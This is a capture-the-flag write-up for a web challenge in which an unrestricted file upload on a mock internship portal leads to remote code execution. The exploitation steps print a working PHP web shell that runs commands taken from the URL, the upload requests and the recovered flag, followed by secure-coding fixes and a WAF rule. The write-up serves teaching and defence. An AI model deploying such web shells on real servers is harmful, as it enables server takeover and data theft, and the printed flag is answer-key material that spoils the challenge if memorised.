# Upload and Conquer

## Challenge Information

| Property | Value |
|----------|-------|
| **Category** | Web Security |
| **Points** | 100 |
| **Solves** | 45 |
| **Flag Format** | `HPTU{_}` |

## Challenge Description

Naukari Intern, a portfolio upload platform for internship applications, contains a critical file upload vulnerability. The application allows users to upload portfolio files but fails to properly validate file types, potentially exposing the system to remote code execution.

**Mission:** Exploit the file upload functionality to achieve remote code execution and retrieve the flag!

---

## Initial Reconnaissance

Visiting the challenge URL presents a professional internship portal interface with:

- Modern file upload section with drag-and-drop functionality
- Supported formats listed as: PDF, DOC, DOCX, JPG, PNG (Max 10MB)
- Upload endpoint: `/upload.php`
- Files stored in `/uploads/` directory
- Professional branding: "Naukari Intern - AI-Powered Internship Matching"

The challenge title "Upload and Conquer" clearly indicates a file upload vulnerability exploitation scenario.

---

## Understanding File Upload Vulnerabilities

Unrestricted File Upload vulnerabilities occur when web applications allow users to upload files without proper validation, enabling attackers to:

- Upload and execute malicious scripts
- Achieve remote code execution (RCE)
- Compromise the web server
- Access sensitive data and system files

### Common Attack Vectors

1. **File Extension Bypass** - Uploading executable files with disguised extensions
2. **MIME Type Spoofing** - Forcing incorrect content-type detection
3. **Path Traversal** - Accessing files outside intended directories
4. **Web Shell Deployment** - Uploading scripts for command execution

---

## Testing for File Upload Vulnerabilities

### Phase 1: Basic Upload Testing

First, testing if the application properly validates file types:

```javascript
// Test basic file upload
const formData = new FormData();
const blob = new Blob(['test content'], { type: 'text/plain' });
formData.append('fileToUpload', blob, 'test.txt');

const response = await fetch('/upload.php', {
    method: 'POST',
    body: formData
});
```

**Result:** Text file uploaded successfully! The application returned "File uploaded successfully!" indicating minimal file validation.

### Phase 2: PHP File Upload Attempt

Next, attempting to upload a PHP file to test for execution capabilities:

```php
<?php 
if(isset($_GET['cmd'])) { 
    system($_GET['cmd']); 
} else {
    echo "Web Shell Active";
    system("ls -la");
}
?>
```

**Result:** PHP file uploaded successfully! The application failed to filter file extensions, allowing direct PHP file upload.

### Phase 3: File Accessibility Verification

Verifying the uploaded PHP file was accessible and executable:

```javascript
// Check if PHP file is accessible
const shellResponse = await fetch('/uploads/shell.php');
console.log(`Access status: ${shellResponse.status}`);
```

**Result:** PHP file accessible at `/uploads/shell.php` with status 200! The server executed the PHP code and returned directory listing.

---

## Exploitation Process

### Step 1: Deploy Advanced Web Shell

Uploading a comprehensive reconnaissance script to locate the flag:

```php
<?php
echo "<pre>";
// Find flag files
system("find / -name '*flag*' -o -name '*FLAG*' 2>/dev/null");
// Check common flag locations
system("cat /flag.txt 2>/dev/null");
system("cat /flag 2>/dev/null"); 
system("pwd");
system("ls -la");
echo "</pre>";
?>
```

### Step 2: Flag Discovery

The web shell execution revealed:

```
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
[...]
/flag.txt
/var/www/html/uploads
total 12
drwxrwxrwt. 1 ctf  ctf   56 Nov  6 05:22 .
dr-xr-xr-x. 1 root root  21 Nov  5 20:47 ..
-rw-r--r--. 1 ctf  ctf  288 Nov  6 05:22 cmd.php
-rw-r--r--. 1 ctf  ctf  567 Nov  6 05:22 finder.php
-rw-r--r--. 1 ctf  ctf  252 Nov  6 05:22 shell.php
nR7b#Lp2VzQ
```

**Critical Finding:** Flag file located at `/flag.txt` with content: `nR7b#Lp2VzQ`

### Step 3: Direct Flag Retrieval

Using the web shell to directly read the flag:

```javascript
// Direct flag retrieval
const flagResponse = await fetch('/uploads/shell.php?cmd=cat /flag.txt');
const flagContent = await flagResponse.text();
// Flag: nR7b#Lp2VzQ
```

---

## Flag Retrieval

**Flag:** `HPTU{nR7b#Lp2VzQ}`

---

## Exploitation Summary

### Attack Flow

1. **Reconnaissance** - Identified file upload functionality at `/upload.php`
2. **Vulnerability Testing** - Verified unrestricted file upload capability
3. **Web Shell Deployment** - Uploaded PHP command execution script
4. **System Reconnaissance** - Used web shell to explore filesystem
5. **Flag Discovery** - Located `/flag.txt` containing the flag
6. **Flag Extraction** - Directly read flag file contents

### Why This Vulnerability Exists

The application failed to implement multiple security controls:

1. **No File Extension Validation** - Allowed `.php` files despite claiming to support only documents/images
2. **No Content-Type Verification** - Accepted any MIME type without validation
3. **Insecure File Storage** - Uploaded files stored in web-accessible directory
4. **Directory Listing Enabled** - Exposed all uploaded files
5. **No File Content Scanning** - Failed to detect malicious code in uploaded files

---

## Technical Analysis

### Vulnerable Code Pattern

```php
// VULNERABLE CODE (hypothetical)
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "File uploaded successfully!";
}
```

### Secure Alternative

```php
// SECURE CODE
$allowed_extensions = ['pdf', 'doc', 'docx', 'jpg', 'png'];
$allowed_types = ['application/pdf', 'application/msword', 'image/jpeg', 'image/png'];
$max_size = 10 * 1024 * 1024;

$file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
$file_type = $_FILES["fileToUpload"]["type"];
$file_size = $_FILES["fileToUpload"]["size"];

if (!in_array($file_extension, $allowed_extensions)) {
    die("Invalid file extension");
}
if (!in_array($file_type, $allowed_types)) {
    die("Invalid file type");
}
if ($file_size > $max_size) {
    die("File too large");
}

// Sanitize filename and store outside web root
$safe_filename = uniqid() . '.' . $file_extension;
$target_file = '/var/storage/uploads/' . $safe_filename;
```

---

## Security Analysis

### Vulnerability Impact: Critical

- **Remote Code Execution** - Full server compromise
- **Data Breach** - Access to all application data
- **System Persistence** - Maintain access through web shells
- **Privilege Escalation** - Potential root access

### Real-World Consequences

In a real internship platform like Naukari Intern, this vulnerability could lead to:

- **Data Theft** - Stealing user resumes, personal information, contact details
- **Service Disruption** - Defacing website or taking down services
- **Malware Distribution** - Hosting malicious files for download
- **Regulatory Violations** - GDPR, CCPA compliance breaches
- **Reputation Damage** - Loss of user trust and business credibility
- **Financial Loss** - Fines, legal costs, and remediation expenses

---

## Security Best Practices

### 1. Input Validation

- **Whitelist allowed file extensions** - Only permit necessary file types
- **Validate MIME types server-side** - Don't trust client-provided content types
- **Implement file content verification** - Check actual file content, not just extension

### 2. Secure File Handling

- **Store files outside web root** - Prevent direct execution
- **Use random filenames** - Eliminate user input from filenames
- **Set proper file permissions** - 644 for files, 755 for directories
- **Implement file size limits** - Prevent resource exhaustion

### 3. Server Configuration

- **Disable execution in upload directories** - Configure web server to not execute scripts
  ```apache
  # Apache .htaccess in uploads directory
  <Files *>
      SetHandler default-handler
  </Files>
  php_flag engine off
  ```
- **Implement Web Application Firewall** - Add ModSecurity or similar
- **Regular security updates** - Keep software patched

### 4. Additional Security Measures

```php
// Content verification example
function verifyFileContent($file_path, $expected_type) {
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_file($finfo, $file_path);
    finfo_close($finfo);
    
    return $mime_type === $expected_type;
}

// Antivirus scanning
function scanForMalware($file_path) {
    exec("clamscan " . escapeshellarg($file_path), $output, $return);
    return $return === 0; // 0 = clean file
}
```

### 5. Monitoring & Detection

- **Log all file upload attempts** - Track who uploaded what and when
- **Monitor for suspicious file types** - Alert on executable file uploads
- **Implement malware scanning** - Use ClamAV or similar tools
- **Set up alerts** - Notify security team of anomalous behavior

---

## Detection Methods

File upload attacks can be detected through:

- **Monitoring for executable file uploads** - `.php`, `.exe`, `.jsp`, `.asp`, etc.
- **Analyzing file content** - Scanning for malicious patterns and code
- **Tracking unusual upload patterns** - Frequency, size, or timing anomalies
- **Web Application Firewall** - ModSecurity rules for upload protection
- **SIEM Integration** - Correlate upload events with other suspicious activity

### Example WAF Rule

```
# ModSecurity rule to block PHP uploads
SecRule FILES_TMPNAMES "@rx \.php$" \
    "id:1000,\
    phase:2,\
    deny,\
    status:403,\
    msg:'PHP file upload detected'"
```

---

## Summary

**Challenge:** Upload and Conquer  
**Difficulty:** Easy-Medium  
**Time to Solve:** 5-10 minutes  
**Tools Used:** Web browser, JavaScript console  
**Flag:** `HPTU{nR7b#Lp2VzQ}`

**Key Skills Demonstrated:**
- Understanding file upload security mechanisms
- Web shell deployment and exploitation
- Remote code execution techniques
- System reconnaissance and flag discovery

---

## Conclusion

This challenge demonstrated a critical unrestricted file upload vulnerability that allowed complete system compromise through web shell deployment. The lack of proper file validation enabled attackers to upload and execute malicious PHP scripts, leading to remote code execution and flag disclosure.

**Key Lessons:**
- Never trust user-uploaded files
- Implement defense in depth with multiple validation layers
- Store uploaded files outside the web root
- Disable script execution in upload directories
- Regular security testing is essential

This highlights the importance of implementing comprehensive file upload security measures in all web applications handling user file uploads.
